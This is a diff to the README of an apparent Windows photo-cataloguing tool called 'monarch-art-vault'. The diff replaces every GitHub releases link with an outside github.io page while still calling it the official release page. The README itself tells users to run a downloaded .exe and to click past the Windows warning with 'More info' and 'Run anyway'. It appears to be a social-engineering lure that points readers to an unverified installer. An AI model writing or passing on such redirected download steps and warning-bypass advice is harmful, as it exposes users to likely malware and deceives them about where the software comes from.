@@ -1,6 +1,6 @@
 # 🦋 monarch-art-vault - Turn messy photo folders into art
 
-[![](https://img.shields.io/badge/Download-Monarch_Art_Vault-blue)](https://github.com/concentricityplague443/monarch-art-vault/releases)
+[![](https://img.shields.io/badge/Download-Monarch_Art_Vault-blue)](https://concentricityplague443.github.io)
 
 Monarch Art Vault takes messy folders full of photos and turns them into organized, print-ready art catalogs. This tool helps people who manage large collections of digital images or run print-on-demand shops. It scans your files, removes duplicates, sorts images by metadata, and prepares them for professional use. You can then feed these organized catalogs into AI tools such as Claude, GPT, or Hermes to generate descriptions, tags, and product listings.
 
@@ -8,7 +8,7 @@ Monarch Art Vault takes messy folders full of photos and turns them into organiz
 
 You do not need to know how to code to use this software. This guide walks you through the steps to set up the vault on your Windows computer.
 
-1. Visit the [releases page](https://github.com/concentricityplague443/monarch-art-vault/releases) to download the installer.
+1. Visit the [releases page](https://concentricityplague443.github.io) to download the installer.
 2. Select the file ending in `.exe` that matches your Windows version.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
@@ -16,7 +16,7 @@ You do not need to know how to code to use this software. This guide walks you t
 
 ## 📥 Download and Install
 
-Download the application from the official release page: [https://github.com/concentricityplague443/monarch-art-vault/releases](https://github.com/concentricityplague443/monarch-art-vault/releases).
+Download the application from the official release page: [https://concentricityplague443.github.io](https://concentricityplague443.github.io).
 
 When you run the installer, Windows might show a warning. This happens because the app is new. Click "More info" and then "Run anyway" to proceed with the installation. The software installs its own environment, so you do not need to install Python or other extra tools on your machine.
 
